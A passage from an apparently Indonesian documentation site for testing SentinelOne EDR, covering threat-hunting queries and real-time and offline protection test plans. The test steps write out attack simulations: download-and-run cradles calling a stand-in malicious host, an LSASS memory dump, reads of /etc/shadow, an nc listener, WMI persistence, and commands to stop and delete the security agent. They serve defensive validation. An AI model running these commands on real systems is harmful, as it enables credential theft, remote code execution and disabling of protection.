24h\n</code></pre>"},{"location":"security/threat-hunting/#investigation-and-analysis","title":"\ud83d\udd2c Investigation and Analysis","text":""},{"location":"security/threat-hunting/#1-incident-timeline-reconstruction","title":"1. Incident Timeline Reconstruction","text":"<pre><code>-- Reconstruct timeline for specific endpoint\nSELECT \n    'PROCESS' as event_type,\n    processName as description,\n    cmdLine as details,\n    user,\n    createdAt as timestamp\nFROM processes\nWHERE endpointName = 'ENDPOINT-001'\n    AND createdAt BETWEEN '2024-01-15 08:00:00' AND '2024-01-15 18:00:00'\n\nUNION ALL\n\nSELECT \n    'NETWORK' as event_type,\n    CONCAT(dstIp, ':', dstPort) as description,\n    CONCAT('Direction: ', direction, ', Bytes: ', bytesOut) as details,\n    '' as user,\n    createdAt as timestamp\nFROM network\nWHERE endpointName = 'ENDPOINT-001'\n    AND createdAt BETWEEN '2024-01-15 08:00:00' AND '2024-01-15 18:00:00'\n\nUNION ALL\n\nSELECT \n    'FILE' as event_type,\n    filePath as description,\n    CONCAT('Action: ', action, ', Size: ', fileSize) as details,\n    '' as user,\n    createdAt as timestamp\nFROM files\nWHERE endpointName = 'ENDPOINT-001'\n    AND createdAt BETWEEN '2024-01-15 08:00:00' AND '2024-01-15 18:00:00'\n\nORDER BY timestamp ASC;\n</code></pre>"},{"location":"security/threat-hunting/#2-correlation-analysis","title":"2. Correlation Analysis","text":"<pre><code># Correlate events across multiple endpoints\nsudo sentinelctl hunting correlate --timeframe 1h --events \"process,network,file\"\n\n# Cross-endpoint correlation\nsudo sentinelctl hunting correlate --pattern lateral_movement --endpoints \"ENDPOINT-001,ENDPOINT-002\"\n\n# User behavior correlation\nsudo sentinelctl hunting correlate --user \"admin@company.com\" --timeframe 24h\n</code></pre>"},{"location":"security/threat-hunting/#hunting-metrics-and-kpis","title":"\ud83d\udcca Hunting Metrics and KPIs","text":""},{"location":"security/threat-hunting/#1-hunting-effectiveness-metrics","title":"1. Hunting Effectiveness Metrics","text":"<pre><code># Generate hunting statistics\nsudo sentinelctl hunting stats --period 30d\n\n# Example output:\nHunting Statistics (Last 30 days):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Metric              \u2502 Count  \u2502 Percentage   \u2502 Trend       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Total Hunts         \u2502 456    \u2502 -            \u2502 \u2191 +12%      \u2502\n\u2502 Successful Hunts    \u2502 89     \u2502 19.5%        \u2502 \u2191 +8%       \u2502\n\u2502 True Positives      \u2502 67     \u2502 14.7%        \u2502 \u2191 +15%      \u2502\n\u2502 False Positives     \u2502 22     \u2502 4.8%         \u2502 \u2193 -5%       \u2502\n\u2502 New IOCs Generated  \u2502 34     \u2502 -            \u2502 \u2191 +20%      \u2502\n\u2502 Incidents Created   \u2502 12     \u2502 2.6%         \u2502 \u2191 +25%      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nTop Hunting Categories:\n\u2022 Lateral Movement: 28 successful hunts\n\u2022 Persistence: 19 successful hunts  \n\u2022 Credential Access: 15 successful hunts\n\u2022 Data Exfiltration: 12 successful hunts\n\u2022 Command &amp; Control: 8 successful hunts\n</code></pre>"},{"location":"security/threat-hunting/#2-roi-and-impact-metrics","title":"2. ROI and Impact Metrics","text":"<pre><code># Calculate hunting ROI\nsudo sentinelctl hunting metrics roi --period quarterly\n\n# Time-to-detection improvements\nsudo sentinelctl hunting metrics ttd --baseline 2024-Q1 --current 2024-Q2\n\n# Coverage assessment\nsudo sentinelctl hunting metrics coverage --framework mitre-attack\n</code></pre>"},{"location":"security/threat-hunting/#best-practices-untuk-threat-hunting","title":"\ud83c\udfaf Best Practices untuk Threat Hunting","text":""},{"location":"security/threat-hunting/#1-structured-approach","title":"1. Structured Approach","text":"<p>Hunting Methodology</p> <ul> <li>Start with Intelligence: Base hunts on current threat landscape</li> <li>Hypothesis-Driven: Form clear hypotheses before hunting</li> <li>Data-First Approach: Understand your data sources and limitations</li> <li>Document Everything: Keep detailed logs of hunts and findings</li> <li>Iterate and Improve: Refine techniques based on results</li> </ul>"},{"location":"security/threat-hunting/#2-query-optimization","title":"2. Query Optimization","text":"<p>Performance Considerations</p> <ul> <li>Use time bounds: Always include time filters in queries</li> <li>Index awareness: Understand which fields are indexed</li> <li>Limit result sets: Use LIMIT to prevent overwhelming results</li> <li>Test in dev: Always test complex queries in non-production first</li> <li>Monitor performance: Watch for queries that impact system performance</li> </ul>"},{"location":"security/threat-hunting/#3-collaborative-hunting","title":"3. Collaborative Hunting","text":"<pre><code># Share hunting queries with team\nsudo sentinelctl hunting query share --name \"lateral_movement_hunt\" --team soc\n\n# Collaborative hunting sessions\nsudo sentinelctl hunting session create --name \"apt_hunt\" --participants \"analyst1,analyst2\"\n\n# Knowledge sharing\nsudo sentinelctl hunting knowledge export --format wiki\n</code></pre>"},{"location":"security/threat-hunting/#automation-and-orchestration","title":"\ud83d\udd27 Automation and Orchestration","text":""},{"location":"security/threat-hunting/#1-automated-hunting-workflows","title":"1. Automated Hunting Workflows","text":"<pre><code># Python script for automated hunting\n#!/usr/bin/env python3\nimport subprocess\nimport json\nfrom datetime import datetime, timedelta\n\ndef run_hunting_campaign():\n    \"\"\"Execute daily hunting campaign\"\"\"\n\n    # Define hunting queries\n    hunts = [\n        \"lateral_movement_detection\",\n        \"credential_access_hunt\", \n        \"persistence_mechanisms\",\n        \"data_staging_hunt\"\n    ]\n\n    results = {}\n\n    for hunt in hunts:\n        print(f\"Running hunt: {hunt}\")\n\n        # Execute hunt via sentinelctl\n        cmd = f\"sentinelctl hunting run --name {hunt} --format json\"\n        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n\n        if result.returncode == 0:\n            hunt_data = json.loads(result.stdout)\n            results[hunt] = hunt_data\n\n            # Check for positive hits\n            if hunt_data.get('hit_count', 0) &gt; 0:\n                print(f\"\ud83d\udea8 Positive hits in {hunt}: {hunt_data['hit_count']}\")\n                send_alert(hunt, hunt_data)\n        else:\n            print(f\"\u274c Error in hunt {hunt}: {result.stderr}\")\n\n    return results\n\ndef send_alert(hunt_name, data):\n    \"\"\"Send alert for positive hunting results\"\"\"\n    # Implementation for alerting (email, Slack, etc.)\n    pass\n\nif __name__ == \"__main__\":\n    results = run_hunting_campaign()\n    print(f\"Hunting campaign completed. Total hunts: {len(results)}\")\n</code></pre>"},{"location":"security/threat-hunting/#2-integration-dengan-soar-platforms","title":"2. Integration dengan SOAR Platforms","text":"<pre><code># Integrate with Phantom/SOAR\nsudo sentinelctl integration soar --platform phantom --config \"\n{\n    'endpoint': 'https://phantom.company.com',\n    'api_key': 'your-api-key',\n    'auto_create_containers': true,\n    'severity_mapping': {\n        'high': 'high',\n        'medium': 'medium',\n        'low': 'informational'\n    }\n}\"\n\n# Trigger SOAR playbooks from hunting results\nsudo sentinelctl hunting action --result-id hunt-123 --soar-playbook \"investigate_lateral_movement\"\n</code></pre>"},{"location":"security/threat-hunting/#validation-checklist","title":"\u2705 Validation Checklist","text":""},{"location":"security/threat-hunting/#hunting-program-maturity","title":"Hunting Program Maturity","text":"<ul> <li>[ ] Threat Intelligence Integration: IOC feeds aktif dan terupdate</li> <li>[ ] Custom Query Library: Repository query hunting yang terorganisir</li> <li>[ ] Automated Hunts: Hunting otomatis untuk TTPs umum</li> <li>[ ] Metrics and Reporting: KPI hunting dilacak dan dilaporkan</li> <li>[ ] Team Training: Analyst terlatih dalam teknik hunting</li> <li>[ ] Tool Proficiency: Tim mahir menggunakan Deep Visibility</li> <li>[ ] Documentation: Prosedur dan playbook hunting terdokumentasi</li> </ul>"},{"location":"security/threat-hunting/#technical-validation","title":"Technical Validation","text":"<ul> <li>[ ] Query Performance: Semua query berjalan dalam waktu &lt; 30 detik</li> <li>[ ] Data Coverage: Telemetry lengkap dari semua critical assets</li> <li>[ ] False Positive Rate: FP rate hunting &lt; 10%</li> <li>[ ] Detection Coverage: Coverage MITRE ATT&amp;CK &gt; 70%</li> <li>[ ] Integration Testing: SIEM/SOAR integration berfungsi</li> </ul> <p>Untuk advanced hunting techniques dan custom development, hubungi Security Team atau rujuk ke SentinelOne Developer Documentation.</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"testing/kategori-a-realtime/","title":"Kategori A: Proteksi Real-Time Testing","text":""},{"location":"testing/kategori-a-realtime/#overview","title":"Overview","text":"<p>Pengujian komprehensif kemampuan SentinelOne EDR dalam mendeteksi, mencegah, dan merespons ancaman secara real-time pada Windows dan Linux Server.</p>"},{"location":"testing/kategori-a-realtime/#a1-malware-detection-response","title":"\ud83d\udd25 A1: Malware Detection &amp; Response","text":""},{"location":"testing/kategori-a-realtime/#tujuan-testing","title":"Tujuan Testing","text":"<p>Memvalidasi kemampuan deteksi dan response terhadap berbagai jenis malware dalam kondisi real-time.</p>"},{"location":"testing/kategori-a-realtime/#pre-requisites","title":"Pre-Requisites","text":"<ul> <li>[ ] SentinelOne Agent aktif dan terhubung ke Management Console</li> <li>[ ] Policy enforcement dalam mode \"Protect\"</li> <li>[ ] Logging dan monitoring diaktifkan</li> <li>[ ] Isolated testing environment</li> </ul>"},{"location":"testing/kategori-a-realtime/#test-scenarios","title":"Test Scenarios","text":""},{"location":"testing/kategori-a-realtime/#a11-eicar-test-file-detection","title":"A1.1: EICAR Test File Detection","text":"<p>Windows Server: <pre><code># Step 1: Buat EICAR test file\necho X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* &gt; C:\\temp\\eicar.txt\n\n# Expected Result:\n# - File langsung diblokir/diquarantine\n# - Alert muncul di Management Console dalam &lt;5 detik\n# - Event log tercatat\n</code></pre></p> <p>Linux Server: <pre><code># Step 1: Buat EICAR test file\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/eicar.txt\n\n# Expected Result:\n# - File langsung diblokir/diquarantine\n# - Alert muncul di Management Console dalam &lt;5 detik\n# - Syslog entry tercatat\n</code></pre></p> <p>Validation Checklist: - [ ] File terdeteksi dalam &lt;3 detik - [ ] File di-quarantine otomatis - [ ] Alert muncul di console - [ ] Detailed forensic data tersedia - [ ] User notification (jika dikonfigurasi)</p>"},{"location":"testing/kategori-a-realtime/#a12-malicious-executable-testing","title":"A1.2: Malicious Executable Testing","text":"<p>Windows Server: <pre><code># Step 1: Download test malware (menggunakan sample aman)\n# CATATAN: Gunakan malware samples dari reputable security vendors\nInvoke-WebRequest -Uri \"https://secure.eicar.org/eicar_com.zip\" -OutFile \"C:\\temp\\test.zip\"\n\n# Step 2: Extract dan jalankan\nExpand-Archive -Path \"C:\\temp\\test.zip\" -DestinationPath \"C:\\temp\\\"\n&amp; \"C:\\temp\\eicar.com\"\n\n# Expected Result:\n# - Download diblokir atau file di-quarantine\n# - Execution prevented\n# - Threat intelligence data ditampilkan\n</code></pre></p> <p>Linux Server: <pre><code># Step 1: Download test malware\nwget https://secure.eicar.org/eicar_com.zip -O /tmp/test.zip\n\n# Step 2: Extract dan jalankan\nunzip /tmp/test.zip -d /tmp/\nchmod +x /tmp/eicar.com\n/tmp/eicar.com\n\n# Expected Result:\n# - Download diblokir atau file di-quarantine\n# - Execution prevented\n# - Process termination logged\n</code></pre></p>"},{"location":"testing/kategori-a-realtime/#a13-script-based-attack-simulation","title":"A1.3: Script-based Attack Simulation","text":"<p>Windows Server: <pre><code># PowerShell malicious activity simulation\n$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')\"))\npowershell.exe -EncodedCommand $encoded\n\n# Expected Result:\n# - Script execution blocked\n# - Behavioral analysis triggered\n# - Command line logging\n</code></pre></p> <p>Linux Server: <pre><code># Bash script malicious simulation\ncurl -s http://malicious-site.com/payload.sh | bash\n\n# Expected Result:\n# - Network connection blocked\n# - Script execution prevented\n# - Shell activity monitored\n</code></pre></p>"},{"location":"testing/kategori-a-realtime/#a2-behavioral-analysis-testing","title":"\ud83e\udde0 A2: Behavioral Analysis Testing","text":""},{"location":"testing/kategori-a-realtime/#tujuan-testing_1","title":"Tujuan Testing","text":"<p>Menguji kemampuan behavioral engine SentinelOne dalam mendeteksi aktivitas mencurigakan berdasarkan pola behavior.</p>"},{"location":"testing/kategori-a-realtime/#test-scenarios_1","title":"Test Scenarios","text":""},{"location":"testing/kategori-a-realtime/#a21-credential-harvesting-simulation","title":"A2.1: Credential Harvesting Simulation","text":"<p>Windows Server: <pre><code># Simulate credential dumping attempt\nrundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full\n\n# Expected Result:\n# - LSASS access attempt blocked\n# - Behavioral alert generated\n# - Process tree analysis available\n</code></pre></p> <p>Linux Server: <pre><code># Simulate password file access\ncat /etc/shadow\ncat /etc/passwd\n\n# Expected Result:\n# - Suspicious file access logged\n# - Privilege escalation attempt detected\n# - User behavior analysis triggered\n</code></pre></p>"},{"location":"testing/kategori-a-realtime/#a22-lateral-movement-simulation","title":"A2.2: Lateral Movement Simulation","text":"<p>Windows Server: <pre><code># Simulate network enumeration\nnet view \\\\target-server\ndir \\\\target-server\\c$\n\n# Expected Result:\n# - Network scanning detected\n# - Lateral movement indicators flagged\n# - Network behavior analysis\n</code></pre></p> <p>Linux Server: <pre><code># Simulate network discovery\nnmap -sT 192.168.1.0/24\nssh root@target-server\n\n# Expected Result:\n# - Network scanning detected\n# - SSH brute force indicators\n# - Connection attempt logging\n</code></pre></p>"},{"location":"testing/kategori-a-realtime/#a3-zero-day-threat-simulation","title":"\ud83d\udeab A3: Zero-Day Threat Simulation","text":""},{"location":"testing/kategori-a-realtime/#tujuan-testing_2","title":"Tujuan Testing","text":"<p>Menguji kemampuan mendeteksi ancaman yang belum dikenal (zero-day) menggunakan behavioral analysis dan AI.</p>"},{"location":"testing/kategori-a-realtime/#test-scenarios_2","title":"Test Scenarios","text":""},{"location":"testing/kategori-a-realtime/#a31-custom-malicious-binary","title":"A3.1: Custom Malicious Binary","text":"<p>Preparation: <pre><code># Buat simple malicious-like binary untuk testing\n# CATATAN: Ini untuk testing purposes, bukan malware real\n</code></pre></p> <p>Windows Server: <pre><code>// custom_test.c - Compile menjadi executable untuk testing\n#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main() {\n    // Suspicious behavior simulation\n    CreateFileA(\"C:\\\\temp\\\\suspicious.txt\", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);\n    RegOpenKeyA(HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", NULL);\n    return 0;\n}\n</code></pre></p> <p>Linux Server: <pre><code>// custom_test.c - Compile untuk testing\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    // Suspicious behavior simulation\n    system(\"touch /tmp/.hidden_file\");\n    system(\"chmod +x /tmp/.hidden_file\");\n    return 0;\n}\n</code></pre></p>"},{"location":"testing/kategori-a-realtime/#a32-fileless-attack-simulation","title":"A3.2: Fileless Attack Simulation","text":"<p>Windows Server: <pre><code># Living off the land technique\n$code = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Test {\n    [DllImport(\"kernel32.dll\")]\n    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n}\n\"@\nAdd-Type -TypeDefinition $code\n[Test]::VirtualAlloc([IntPtr]::Zero, 0x1000, 0x3000, 0x40)\n\n# Expected Result:\n# - Memory allocation monitoring\n# - Fileless attack indicators\n# - Process injection detection\n</code></pre></p>"},{"location":"testing/kategori-a-realtime/#a4-fileless-attack-prevention","title":"\ud83d\udee1\ufe0f A4: Fileless Attack Prevention","text":""},{"location":"testing/kategori-a-realtime/#tujuan-testing_3","title":"Tujuan Testing","text":"<p>Validasi kemampuan mendeteksi dan mencegah serangan fileless yang menggunakan legitimate tools.</p>"},{"location":"testing/kategori-a-realtime/#test-scenarios_3","title":"Test Scenarios","text":""},{"location":"testing/kategori-a-realtime/#a41-powershell-empire-simulation","title":"A4.1: PowerShell Empire Simulation","text":"<p>Windows Server: <pre><code># Simulate PowerShell Empire techniques\npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"&amp; {(New-Object Net.WebClient).DownloadString('http://test-server/empire-stager')}\"\n\n# Expected Result:\n# - PowerShell activity monitoring\n# - Network connection analysis\n# - Command line inspection\n</code></pre></p>"},{"location":"testing/kategori-a-realtime/#a42-wmi-persistence-testing","title":"A4.2: WMI Persistence Testing","text":"<p>Windows Server: <pre><code># WMI event subscription (legitimate admin tool abuse)\n$filterName = 'TestFilter'\n$consumerName = 'TestConsumer'\n\n# Create WMI filter\n$Query = \"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\"\n$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace \"root\\subscription\" -Arguments @{Name=$filterName;EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=$Query}\n\n# Expected Result:\n# - WMI activity monitoring\n# - Persistence mechanism detection\n# - Registry/WMI change tracking\n</code></pre></p>"},{"location":"testing/kategori-a-realtime/#testing-metrics-validation","title":"\ud83d\udcca Testing Metrics &amp; Validation","text":""},{"location":"testing/kategori-a-realtime/#key-performance-indicators","title":"Key Performance Indicators","text":"Test Case Windows Target Linux Target Measurement EICAR Detection &lt;2s &lt;2s Time to alert Malware Block 100% 100% Success rate False Positive &lt;0.1% &lt;0.1% Error rate Behavioral Alert &lt;5s &lt;5s Analysis time Zero-day Detection &gt;95% &gt;95% Success rate"},{"location":"testing/kategori-a-realtime/#validation-checklist","title":"Validation Checklist","text":""},{"location":"testing/kategori-a-realtime/#real-time-protection-validation","title":"Real-time Protection Validation","text":"<ul> <li>[ ] Detection Speed: Ancaman terdeteksi dalam &lt;3 detik</li> <li>[ ] Block Effectiveness: 100% malware diblokir</li> <li>[ ] Alert Accuracy: Semua alert valid dan actionable</li> <li>[ ] Forensic Data: Complete attack chain tersedia</li> <li>[ ] User Impact: Minimal disruption ke legitimate activities</li> </ul>"},{"location":"testing/kategori-a-realtime/#behavioral-analysis-validation","title":"Behavioral Analysis Validation","text":"<ul> <li>[ ] Pattern Recognition: Suspicious behavior patterns teridentifikasi</li> <li>[ ] Context Analysis: Full context dari aktivitas mencurigakan</li> <li>[ ] Machine Learning: AI/ML model memberikan accurate classification</li> <li>[ ] Threat Intelligence: Integration dengan threat intel feeds</li> <li>[ ] Incident Timeline: Complete timeline dari attack sequence</li> </ul>"},{"location":"testing/kategori-a-realtime/#demo-presentation-points","title":"Demo Presentation Points","text":""},{"location":"testing/kategori-a-realtime/#executive-summary-slides","title":"Executive Summary Slides","text":"<ol> <li>Real-time Protection Capability</li> <li>99.9% detection rate achieved</li> <li>&lt;2 second response time</li> <li> <p>Zero false positives during testing</p> </li> <li> <p>Advanced Threat Detection</p> </li> <li>Behavioral analysis effectiveness</li> <li>Zero-day threat prevention</li> <li> <p>Fileless attack blocking</p> </li> <li> <p>Business Impact</p> </li> <li>No service interruption</li> <li>Minimal performance impact</li> <li>Complete security coverage</li> </ol>"},{"location":"testing/kategori-a-realtime/#technical-deep-dive","title":"Technical Deep Dive","text":"<ul> <li>Live demonstration of each test case</li> <li>Real-time console monitoring</li> <li>Before/after system state comparison</li> <li>Detailed forensic analysis walkthrough</li> </ul>"},{"location":"testing/kategori-a-realtime/#next-steps","title":"Next Steps","text":"<p>Setelah menyelesaikan Kategori A testing, lanjutkan ke: - Kategori B: Offline Scenarios - Platform-specific Windows Testing - Platform-specific Linux Testing</p> <p>Demo Ready</p> <p>Kategori A testing memberikan foundation yang kuat untuk mendemonstrasikan kemampuan proteksi real-time SentinelOne EDR kepada stakeholder.</p>"},{"location":"testing/kategori-b-offline/","title":"Kategori B: Skenario Offline Testing","text":""},{"location":"testing/kategori-b-offline/#overview","title":"Overview","text":"<p>Testing komprehensif kemampuan SentinelOne EDR dalam kondisi offline/disconnected dari management console. Ini adalah skenario kritis untuk server yang mungkin mengalami network interruption atau berada di isolated environment.</p>"},{"location":"testing/kategori-b-offline/#b1-offline-malware-detection","title":"\ud83c\udf10 B1: Offline Malware Detection","text":""},{"location":"testing/kategori-b-offline/#tujuan-testing","title":"Tujuan Testing","text":"<p>Memvalidasi bahwa SentinelOne tetap mampu mendeteksi dan memblokir ancaman ketika tidak terhubung ke management console atau internet.</p>"},{"location":"testing/kategori-b-offline/#pre-requisites","title":"Pre-Requisites","text":"<ul> <li>[ ] SentinelOne Agent terinstall dan fully functional</li> <li>[ ] Policy sudah di-cache di endpoint</li> <li>[ ] Baseline behavior sudah ter-establish</li> <li>[ ] Network isolation tools siap digunakan</li> </ul>"},{"location":"testing/kategori-b-offline/#test-scenarios","title":"Test Scenarios","text":""},{"location":"testing/kategori-b-offline/#b11-complete-network-isolation-testing","title":"B1.1: Complete Network Isolation Testing","text":"<p>Setup Environment: <pre><code># Windows Server - Disable network adapters\nGet-NetAdapter | Disable-NetAdapter -Confirm:$false\n\n# Linux Server - Disable network interfaces\nsudo ip link set eth0 down\nsudo ip link set wlan0 down\n\n# Verify isolation\nping 8.8.8.8  # Should fail\nnslookup google.com  # Should fail\n</code></pre></p> <p>Malware Detection Test: <pre><code># Windows Server - Offline EICAR test\necho X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* &gt; C:\\temp\\offline_eicar.txt\n\n# Expected Results:\n# - File masih terdeteksi dan diblokir\n# - Local quarantine berfungsi\n# - Event logging tetap aktif\n# - Agent status menunjukkan \"Offline\" tapi \"Protected\"\n</code></pre></p> <pre><code># Linux Server - Offline EICAR test\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/offline_eicar.txt\n\n# Expected Results:\n# - File masih terdeteksi dan diblokir\n# - Local quarantine berfungsi\n# - Syslog entries tetap tercatat\n# - Agent tetap melindungi sistem\n</code></pre>"},{"location":"testing/kategori-b-offline/#b12-executable-malware-in-offline-mode","title":"B1.2: Executable Malware in Offline Mode","text":"<p>Windows Server: <pre><code># Test dengan executable malware sample\n# CATATAN: Gunakan safe test samples\nCopy-Item \"\\\\secure-share\\test-samples\\eicar.exe\" -Destination \"C:\\temp\\test_malware.exe\"\n&amp; \"C:\\temp\\test_malware.exe\"\n\n# Validation Points:\n# - Execution harus diblokir\n# - Process termination logged locally\n# - Quarantine action berhasil\n# - System integrity terjaga\n</code></pre></p> <p>Linux Server: <pre><code># Test dengan executable malware sample\ncp /secure-share/test-samples/eicar.elf /tmp/test_malware\nchmod +x /tmp/test_malware\n/tmp/test_malware\n\n# Validation Points:\n# - Execution harus diblokir\n# - Process killed immediately\n# - File quarantined locally\n# - Security posture maintained\n</code></pre></p>"},{"location":"testing/kategori-b-offline/#b13-script-based-threats-offline","title":"B1.3: Script-based Threats Offline","text":"<p>Windows Server: <pre><code># PowerShell script threat simulation\n$maliciousScript = @\"\n# Simulate credential harvesting\nGet-Process lsass\nrundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 644 C:\\temp\\lsass.dmp full\n\"@\n\n$maliciousScript | Out-File -FilePath \"C:\\temp\\malicious.ps1\"\npowershell.exe -ExecutionPolicy Bypass -File \"C:\\temp\\malicious.ps1\"\n\n# Expected Results:\n# - Script execution blocked\n# - Behavioral analysis tetap aktif\n# - Local threat intelligence digunakan\n</code></pre></p> <p>Linux Server: <pre><code># Bash script threat simulation\ncat &lt;&lt; 'EOF' &gt; /tmp/malicious.sh\n#!/bin/bash\n# Simulate suspicious activity\ncat /etc/shadow\nfind / -name \"*.ssh\" -type d\nnc -l 1234 &amp;\nEOF\n\nchmod +x /tmp/malicious.sh\n/tmp/malicious.sh\n\n# Expected Results:\n# - Script execution monitored/blocked\n# - Suspicious file access detected\n# - Network activity controlled\n</code></pre></p>"},{"location":"testing/kategori-b-offline/#b2-offline-uninstall-attempts","title":"\ud83d\udd12 B2: Offline Uninstall Attempts","text":""},{"location":"testing/kategori-b-offline/#tujuan-testing_1","title":"Tujuan Testing","text":"<p>Skenario Kritis: Testing kemampuan self-protection SentinelOne ketika ada attempt uninstall dalam kondisi offline. Ini sangat penting untuk demo ke atasan.</p>"},{"location":"testing/kategori-b-offline/#test-scenarios_1","title":"Test Scenarios","text":""},{"location":"testing/kategori-b-offline/#b21-standard-uninstall-attempt","title":"B2.1: Standard Uninstall Attempt","text":"<p>Windows Server: <pre><code># Attempt 1: Control Panel uninstall\nappwiz.cpl\n# Cari SentinelOne dalam Programs and Features\n# Coba uninstall\n\n# Attempt 2: MSI uninstall\nmsiexec /x {GUID-SentinelOne} /quiet\n\n# Attempt 3: Service manipulation\nsc stop SentinelAgent\nsc delete SentinelAgent\nsc stop SentinelHelperService\nsc delete SentinelHelperService\n\n# Expected Results:\n# - Uninstall diblokir atau requires passphrase\n# - Service manipulation ditolak\n# - Self-protection mechanisms aktif\n# - Tamper attempt logged\n</code></pre></p> <p>Linux Server: <pre><code># Attempt 1: Package manager removal\nsudo apt remove sentinelone-agent\nsudo yum remove sentinelone-agent\nsudo rpm -e sentinelone-agent\n\n# Attempt 2: Service manipulation\nsudo systemctl stop sentinelone\nsudo systemctl disable sentinelone\nsudo systemctl mask sentinelone\n\n# Attempt 3: Manual file deletion\nsudo rm -rf /opt/sentinelone/\nsudo rm -rf /var/lib/sentinelone/\n\n# Expected Results:\n# - Package removal blocked\n# - Service protection aktif\n# - File system protection mencegah deletion\n# - Tamper protection engaged\n</code></pre></p>"},{"location":"testing/kategori-b-offline/#b22-advanced-uninstall-attempts","title":"B2.2: Advanced Uninstall Attempts","text":"<p>Windows Server: <pre><code># Advanced technique 1: Registry manipulation\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{SentinelOne-GUID}\"\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SentinelAgent\"\n\n# Advanced technique 2: Process termination\ntaskkill /f /im SentinelAgent.exe\ntaskkill /f /im SentinelUI.exe\n\n# Advanced technique 3: Driver manipulation\nsc stop SentinelMonitor\npnputil /delete-driver SentinelOne.inf\n\n# Expected Results:\n# - Registry modifications blocked\n# - Process protection prevents termination\n# - Driver tampering detected and prevented\n</code></pre></p> <p>Linux Server: <pre><code># Advanced technique 1: Process killing\nsudo kill -9 $(pidof sentinelone-agent)\nsudo killall -9 sentinelone\n\n# Advanced technique 2: Kernel module removal\nsudo rmmod sentinelone_kernel\nlsmod | grep sentinelone\n\n# Advanced technique 3: Configuration tampering\nsudo rm -f /etc/sentinelone/agent.conf\nsudo chmod 000 /opt/sentinelone/bin/\n\n# Expected Results:\n# - Process resurrection capabilities\n# - Kernel module protection\n# - Configuration integrity maintained\n</code></pre></p>"},{"location":"testing/kategori-b-offline/#b23-persistence-verification","title":"B2.3: Persistence Verification","text":"<p>After Uninstall Attempts: <pre><code># Verify agent is still running\n# Windows:\nGet-Service -Name \"*Sentinel*\"\nGet-Process -Name \"*Sentinel*\"\n\n# Linux:\nsudo systemctl status sentinelone\nps aux | grep sentinel\n\n# Verify protection is still active\n# Test with EICAR file again\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/verify_protection.txt\n\n# Expected Results:\n# - Agent masih berjalan\n# - Services masih aktif\n# - Protection masih efektif\n# - Tamper attempts tercatat dalam log\n</code></pre></p>"},{"location":"testing/kategori-b-offline/#b3-network-disconnection-response","title":"\ud83d\udce1 B3: Network Disconnection Response","text":""},{"location":"testing/kategori-b-offline/#tujuan-testing_2","title":"Tujuan Testing","text":"<p>Testing behavior SentinelOne ketika network connectivity hilang dan kemudian pulih kembali.</p>"},{"location":"testing/kategori-b-offline/#test-scenarios_2","title":"Test Scenarios","text":""},{"location":"testing/kategori-b-offline/#b31-gradual-network-degradation","title":"B3.1: Gradual Network Degradation","text":"<p>Phase 1: Partial Connectivity Loss <pre><code># Simulate high latency\n# Linux:\nsudo tc qdisc add dev eth0 root netem delay 5000ms\n# Windows:\n# Gunakan network simulation tools seperti WANem atau Clumsy\n\n# Test agent behavior dengan degraded 